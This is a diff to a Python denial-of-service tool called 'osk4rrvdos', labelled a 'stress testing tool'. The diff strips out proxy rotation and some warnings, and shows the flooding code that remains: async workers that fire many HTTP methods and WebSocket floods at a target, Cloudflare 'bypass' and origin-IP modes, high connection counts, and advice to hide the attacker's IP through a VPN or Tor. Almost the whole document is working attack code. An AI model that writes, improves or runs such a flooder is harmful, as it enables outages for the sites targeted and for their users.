@@ -546,7 +546,7 @@ def show_banner():
 
 def print_live():
     global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
-    global proxy_mode, proxy_alive, bypass_active, latency_times, total_bytes_sent, total_bytes_recv
+    global bypass_active, latency_times, total_bytes_sent, total_bytes_recv
     if stopped:
         return
     os.system("cls" if os.name == "nt" else "clear")
@@ -561,7 +561,6 @@ def print_live():
  \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
 """)
     last_str = f"{last_http_code} / {last_code_label}" if last_http_code else "— / —"
-    px_str = f"Yes / {proxy_alive} alive" if proxy_mode else "No"
     bp_str = "Yes" if bypass_active else "No"
     bt_str = "Yes" if boost_mode else "No"
     mm_str = "Yes" if multi_method else "No"
@@ -575,7 +574,6 @@ def print_live():
     safe_print(f" Request sent      : {total_sent}")
     safe_print(f" Request failed    : {total_failed}")
     safe_print(f" Request success   : {total_success} ({success_rate:.1f}%)")
-    safe_print(f" Proxy             : {px_str}")
     safe_print(f" Bypass            : {bp_str}")
     safe_print(f" Boost             : {bt_str}")
     safe_print(f" Multi-method      : {mm_str}")
@@ -1204,8 +1202,6 @@ async def attack_worker(session, url_obj, host, tid):
         else:
             target = f"{scheme}://{netloc}{path}"
 
-        proxy = next_proxy() if proxy_mode else None
-
         # WebSocket flood attack vector
         if enable_websocket and random.random() < 0.25:
             try:
@@ -1214,7 +1210,7 @@ async def attack_worker(session, url_obj, host, tid):
                     ws_target = f"{scheme.replace('http', 'ws')}://{origin_ip}{ws_path}"
                 else:
                     ws_target = f"{scheme.replace('http', 'ws')}://{netloc}{ws_path}"
-                async with session.ws_connect(ws_target, headers=headers, proxy=proxy,
+                async with session.ws_connect(ws_target, headers=headers,
                                               timeout=aiohttp.ClientTimeout(total=2),
                                               protocols=["chat", "binary", "super"],
                                               autoping=False) as ws:
@@ -1249,38 +1245,35 @@ async def attack_worker(session, url_obj, host, tid):
 
         try:
             if method == "GET":
-                ctx = session.get(target, headers=headers, proxy=proxy,
+                ctx = session.get(target, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=3),
                                   allow_redirects=True)
             elif method == "POST":
                 ctx = session.post(target, headers=headers, data=post_data,
-                                   proxy=proxy,
                                    timeout=aiohttp.ClientTimeout(total=3),
                                    allow_redirects=True)
             elif method == "HEAD":
-                ctx = session.head(target, headers=headers, proxy=proxy,
+                ctx = session.head(target, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=3),
                                    allow_redirects=True)
             elif method == "OPTIONS":
-                ctx = session.options(target, headers=headers, proxy=proxy,
+                ctx = session.options(target, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=3),
                                       allow_redirects=True)
             elif method == "PUT":
                 ctx = session.put(target, headers=headers, data=post_data,
-                                  proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=3),
                                   allow_redirects=True)
             elif method == "PATCH":
                 ctx = session.patch(target, headers=headers, data=post_data,
-                                    proxy=proxy,
                                     timeout=aiohttp.ClientTimeout(total=3),
                                     allow_redirects=True)
             elif method == "DELETE":
-                ctx = session.delete(target, headers=headers, proxy=proxy,
+                ctx = session.delete(target, headers=headers,
                                      timeout=aiohttp.ClientTimeout(total=3),
                                      allow_redirects=True)
             else:
-                ctx = session.get(target, headers=headers, proxy=proxy,
+                ctx = session.get(target, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=3),
                                   allow_redirects=True)
 
@@ -1311,20 +1304,13 @@ async def attack_worker(session, url_obj, host, tid):
                     total_sent += 1
                     last_http_code = code
                     last_code_label = code_label(code)
-                    if proxy:
-                        total_proxy_used += 1
-                    else:
-                        total_direct_used += 1
+                    total_direct_used += 1
                     if 200 <= code < 400:
                         total_success += 1
                         if cf_kill:
                             cf_bypass_count += 1
-                        if proxy:
-                            proxy_manager.report(proxy, True, latency)
                     else:
                         total_failed += 1
-                        if proxy:
-                            proxy_manager.report(proxy, False, latency)
                     if method == "GET":
                         total_get_sent += 1
                     elif method == "POST":
@@ -1342,7 +1328,7 @@ async def attack_worker(session, url_obj, host, tid):
         except (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError,
                 aiohttp.ClientOSError, aiohttp.ClientPayloadError,
                 aiohttp.ClientError, asyncio.TimeoutError) as e:
-            err_msg = f"{type(e).__name__}: {str(e)[:120]} | target={target} | proxy={proxy}"
+            err_msg = f"{type(e).__name__}: {str(e)[:120]} | target={target}"
             log_error(err_msg)
             with lock:
                 total_sent += 1
@@ -1356,10 +1342,8 @@ async def attack_worker(session, url_obj, host, tid):
                     total_head_sent += 1
                 if total_failed <= 10:
                     last_code_label = f"ERR: {type(e).__name__[:20]}"
-            if proxy:
-                remove_bad_proxy(proxy)
         except Exception as e:
-            err_msg = f"UNEXPECTED {type(e).__name__}: {str(e)[:120]} | target={target} | proxy={proxy}"
+            err_msg = f"UNEXPECTED {type(e).__name__}: {str(e)[:120]} | target={target}"
             log_error(err_msg)
             with lock:
                 total_sent += 1
@@ -1422,15 +1406,17 @@ async def http_attack(url, host, conns):
     all_tasks = []
 
     for s_idx in range(session_count):
-        connector = aiohttp.TCPConnector(
-            ssl=ssl_ctx,
-            limit=conns * 3,
-            limit_per_host=0,
-            force_close=force_close_conns,
-            enable_cleanup_closed=True,
-            ttl_dns_cache=300,
-            keepalive_timeout=30,
-        )
+        conn_kwargs = {
+            "ssl": ssl_ctx,
+            "limit": conns * 3,
+            "limit_per_host": 0,
+            "force_close": force_close_conns,
+            "enable_cleanup_closed": True,
+            "ttl_dns_cache": 300,
+        }
+        if not force_close_conns:
+            conn_kwargs["keepalive_timeout"] = 30
+        connector = aiohttp.TCPConnector(**conn_kwargs)
         sess = aiohttp.ClientSession(connector=connector)
         sessions.append(sess)
         for i in range(conns):
@@ -1556,9 +1542,7 @@ def main():
         if cli.config:
             cfg = load_config(cli.config)
             safe_print(f"< / > Loaded config from {cli.config}")
-        if not cli.yes and not cli.target:
-            input(" Press ENTER to continue (Ctrl+C to exit): ")
-    else:
+    if not cli or not cli.target:
         input(" Press ENTER to continue (Ctrl+C to exit): ")
 
     if cli and cli.target:
@@ -1577,7 +1561,7 @@ def main():
     scheme = parsed.scheme
     port = parsed.port or (443 if scheme == "https" else 80)
 
-    proxy_mode = _bool_or_prompt(cli.proxy if cli else None, "\n[osk4rrvdos] Proxy attack [y/n]: ", interactive)
+    proxy_mode = False
     bypass_active = _bool_or_prompt(cli.bypass if cli else None, "[osk4rrvdos] Bypass [y/n]: ", interactive)
     boost_mode = _bool_or_prompt(cli.boost if cli else None, "[osk4rrvdos] Boost mode [y/n]: ", interactive)
     multi_method = _bool_or_prompt(cli.multi_method if cli else None, "[osk4rrvdos] Multi-method [y/n]: ", interactive)
@@ -1617,16 +1601,11 @@ def main():
         else:
             session_count = 3
 
-    if not proxy_mode:
-        safe_print("\n [!] WARNING: Direct mode — your real IP WILL be visible!")
-        safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
-        if not cli or not cli.yes:
-            if interactive:
-                if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
-                    return
-            else:
-                safe_print("[!] Use --yes to skip warnings in non-interactive mode")
-                return
+    safe_print("\n [!] Direct mode — your real IP WILL be visible!")
+    safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
+    if interactive:
+        if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
+            return
 
     safe_print(f"\n[*] Target: {scheme}://{host}:{port}")
 
@@ -1682,55 +1661,6 @@ def main():
             safe_print(f"    Subdomains found: {cf_subdomains_found}")
             safe_print("")
 
-    if proxy_mode:
-        cached = _load_proxy_cache()
-        if cached:
-            safe_print(f"< / > Loaded {len(cached)} proxies from cache")
-            proxy_pool = list(set(cached))
-            random.shuffle(proxy_pool)
-        else:
-            safe_print("< / > Fetching online proxies...")
-            raw = fetch_online_proxies()
-            if not raw:
-                safe_print("[!] Failed to fetch online proxies.")
-                if not prompt_yn("[osk4rrvdos] Continue without proxies? [y/n]: "):
-                    return
-                proxy_mode = False
-                proxy_pool = []
-                proxy_alive = 0
-            else:
-                safe_print(f"< / > Fetched {len(raw)} total")
-                proxy_pool = list(set(raw))
-                random.shuffle(proxy_pool)
-
-        if proxy_mode and proxy_pool:
-            random.shuffle(proxy_pool)
-            _save_proxy_cache()
-            proxy_alive = len(proxy_pool)
-            safe_print(f"< / > Pool: {proxy_alive} proxies ready")
-
-            if proxy_alive > 0:
-                validate_proxies_background(proxy_pool, target)
-                valid = wait_for_proxy_validation()
-                if valid:
-                    proxy_pool = valid
-                    proxy_alive = len(proxy_pool)
-                    proxy_manager.load(proxy_pool)
-                    _save_proxy_cache()
-                    safe_print(f"< / > {proxy_alive} validated proxies ready")
-                else:
-                    safe_print("[!] No valid proxies after testing")
-                    proxy_mode = False
-                    proxy_pool = []
-                    proxy_alive = 0
-
-            if proxy_alive == 0:
-                safe_print("[!] No proxies — switching to direct mode")
-                proxy_mode = False
-    else:
-        proxy_pool = []
-        proxy_alive = 0
-
     safe_print("\n< / > Initializing...\n")
 
     if bypass_active:
@@ -1743,14 +1673,12 @@ def main():
         safe_print("")
 
     if cf_kill and direct_origin and origin_ips:
-        conns = min(600, max(300, (proxy_alive if proxy_mode else 400) // 2 + 200))
+        conns = min(600, max(300, 400 // 2 + 200))
     elif boost_mode:
-        base_conns = min(800, max(400, (proxy_alive if proxy_mode else 500) // 2 + 300))
+        base_conns = min(800, max(400, 500 // 2 + 300))
         conns = base_conns // session_count
     elif bypass_active or cf_kill:
-        conns = min(400, max(200, (proxy_alive if proxy_mode else 250) // 2 + 150))
-    elif proxy_mode:
-        conns = min(250, max(120, proxy_alive // 2 + 50))
+        conns = min(400, max(200, 250 // 2 + 150))
     else:
         conns = 200
 
@@ -1767,9 +1695,8 @@ def main():
             connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
             async with aiohttp.ClientSession(connector=connector) as s:
                 p_headers = build_headers(host, None, "GET")
-                p_target = f"{scheme}://{host}/"
-                p_proxy = next_proxy() if proxy_mode else None
-                async with s.get(p_target, headers=p_headers, proxy=p_proxy,
+                p_target = f"{scheme}://{parsed.netloc}/"
+                async with s.get(p_target, headers=p_headers,
                                  timeout=aiohttp.ClientTimeout(total=10),
                                  allow_redirects=True) as resp:
                     await resp.read()
@@ -1778,7 +1705,7 @@ def main():
         loop.close()
         safe_print(f"    Pre-flight OK — status {p_code}")
     except Exception as e:
-        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target if 'p_target' in locals() else 'N/A'} | proxy={p_proxy if 'p_proxy' in locals() else 'N/A'}"
+        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target if 'p_target' in locals() else 'N/A'}"
         log_error(err_msg)
         safe_print(f"    Pre-flight FAIL — {type(e).__name__}: {str(e)[:80]}")
         safe_print("    Continuing anyway...")
@@ -1828,8 +1755,6 @@ def main():
     safe_print(f"     Request sent    : {total_sent}")
     safe_print(f"     Request success : {total_success} ({success_rate:.1f}%)")
     safe_print(f"     Request failed  : {total_failed}")
-    safe_print(f"     Proxy routed    : {total_proxy_used}")
-    safe_print(f"     Direct routed   : {total_direct_used}")
     safe_print(f"     GET / POST / HEAD: {total_get_sent} / {total_post_sent} / {total_head_sent}")
     safe_print(f"     429 / 503       : {total_429} / {total_503}")
     safe_print(f"     Conn errors     : {connection_errors}")
@@ -1848,8 +1773,7 @@ def main():
 
 def parse_args():
     parser = argparse.ArgumentParser(description="osk4rrvdos - network stress testing tool")
-    parser.add_argument("target", nargs="?", help="Target URL")
-    parser.add_argument("--proxy", "-p", action="store_true", help="Use proxy mode")
+    parser.add_argument("--target", "-t", type=str, help="Target URL")
     parser.add_argument("--bypass", "-b", action="store_true", help="Enable bypass")
     parser.add_argument("--boost", "-B", action="store_true", help="Enable boost mode")
     parser.add_argument("--multi-method", "-m", action="store_true", help="Enable multi-method")
@@ -1865,7 +1789,6 @@ def parse_args():
     parser.add_argument("--sessions", type=int, default=3, help="Number of sessions")
     parser.add_argument("--conns", type=int, default=0, help="Connections per session (0=auto)")
     parser.add_argument("--config", "-C", type=str, help="Config file path")
-    parser.add_argument("--yes", "-y", action="store_true", help="Skip warnings")
     return parser.parse_args()
 
 def load_config(path):
